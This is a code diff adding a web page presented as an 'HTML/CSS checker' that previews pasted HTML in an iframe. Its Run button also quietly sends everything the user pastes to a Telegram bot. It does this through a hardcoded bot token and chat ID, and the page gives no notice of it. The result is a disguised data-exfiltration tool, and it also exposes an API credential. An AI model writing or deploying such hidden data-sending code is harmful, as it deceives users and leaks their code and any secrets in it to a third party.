@@ -1,0 +1,133 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML/CSS CHECKER</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nosifer&display=swap');
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Nosifer', cursive;
+            text-align: center;
+            padding: 50px 0;
+            margin: 0;
+            position: relative;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            border: 2px solid #ff0000;
+            padding: 30px;
+            background: #1a1a1a;
+            box-shadow: 0 0 15px #ff0000;
+            position: relative;
+            z-index: 1;
+        }
+        h1 {
+            font-size: 3em;
+            color: #ff0000;
+            text-shadow: 2px 2px 10px #ff0000;
+            margin-bottom: 20px;
+        }
+        input, button, textarea {
+            padding: 15px;
+            font-size: 1.2em;
+            margin: 10px 0;
+            border: 1px solid #ff0000;
+            background: #333;
+            color: #ff0000;
+            box-shadow: 0 0 5px #ff0000;
+            width: 90%;
+        }
+        button {
+            background-color: red;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        #output {
+            border: 1px solid #ccc;
+            height: 300px;
+            background: #f9f9f9;
+            overflow: auto;
+            color: black;
+        }
+        /* Hiding the logo */
+        .logo {
+            display: none; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>HTML CHECKER</h1>
+    <form id="htmlForm">
+        <textarea id="htmlInput" placeholder="Enter your HTML/CSS here..." rows="10"></textarea>
+        <div>
+            <button type="button" id="runButton">Run</button>
+            <button type="button" id="resetButton">Reset</button>
+        </div>
+    </form>
+
+    <h2>Output:</h2>
+    <div id="output"></div>
+    <h2>CODE-X</h2>   
+    <h2>DARK SERIES XYLON</h2>     
+</div>
+
+<script>
+    document.getElementById('runButton').onclick = function() {
+        const htmlContent = document.getElementById('htmlInput').value;
+
+        // Create an iframe and render HTML inside it
+        const output = document.getElementById('output');
+        output.innerHTML = ''; // Clear previous content
+        const iframe = document.createElement('iframe');
+        iframe.style.width = '100%';
+        iframe.style.height = '100%';
+        iframe.style.border = 'none';
+        output.appendChild(iframe);
+
+        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        iframeDoc.open();
+        iframeDoc.write(htmlContent);
+        iframeDoc.close();
+
+        // Send the content to the bot
+        const botToken = '7378555880:AAHRHDJ_hWifCAreUgI52RGVQq5ad3ACGC0';  // Replace with your bot token
+        const chatId = '6070021548';      // Replace with your chat ID
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: htmlContent
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
+    };
+
+    document.getElementById('resetButton').onclick = function() {
+        document.getElementById('htmlInput').value = ''; // Clear input
+        document.getElementById('output').innerHTML = ''; // Clear output
+    };
+</script>
+
+</body>
+</html>
